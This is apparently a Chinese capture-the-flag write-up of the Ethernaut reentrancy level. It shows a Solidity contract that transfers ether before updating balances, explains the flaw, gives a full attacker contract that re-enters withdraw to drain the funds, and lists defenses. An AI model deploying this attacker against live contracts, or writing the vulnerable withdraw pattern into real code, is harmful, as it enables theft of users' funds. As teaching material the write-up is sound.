# 10. Re-entrancy
### 原题
```
这一关的目标是偷走合约的所有资产.
```
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```
### 分析
这道题让我感觉偷感好重：）\
其实这个在开发中是必须要注意的重入漏洞，算是防范的基本要求了。但是早期的时候，有的合约开发确实有一些疏忽，造成重要损失的也有。\
我们主要看withdraw这个函数，首先是判断余额，然后使用call()转账，最后是更新余额。\
这个步骤就出现了漏洞，如果msg.sender是个攻击合约的话，这个攻击合约在收到转账后，会执行fallback或者receive函数，又可以继续发起调用withdraw()，\
因为“balances[msg.sender] -= _amount;”还没执行，所以余额始终还没变化，\
“balances[msg.sender] >= _amount”每次都通过校验。这样就可以再次调用，把余额全部偷完。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function withdraw(uint256 _amount) external ;
    function donate(address _to) external  payable;
    function balanceOf(address _who) external view returns (uint256 balance);
}

contract ReentranceAttack {

    IReentrance reentrance;
    
    constructor(address _reentrance) public payable {
       reentrance = IReentrance(_reentrance);
    }

    function attack() public {
      (bool success,) = address(reentrance).call{value: 0.001 ether}(abi.encodeWithSelector(bytes4(keccak256("donate(address)")), address(this)));
      require(success, "attack failed");
      reentrance.withdraw(0.001 ether);
    }

    receive() payable external  {
      //如果是reentrance的余额大于0，我会重入攻击，把余额转走
      if (reentrance.balanceOf(address(this)) > 0) {
        reentrance.withdraw(reentrance.balanceOf(address(this)));
      } 
      
    }
}
```
### 总结
所以在现实开发中，一定要防范重入攻击。有以下解决方案：
1. 自己写防重入修饰器
2. 先改状态，再执行转账
3. 使用openzepplin的公共库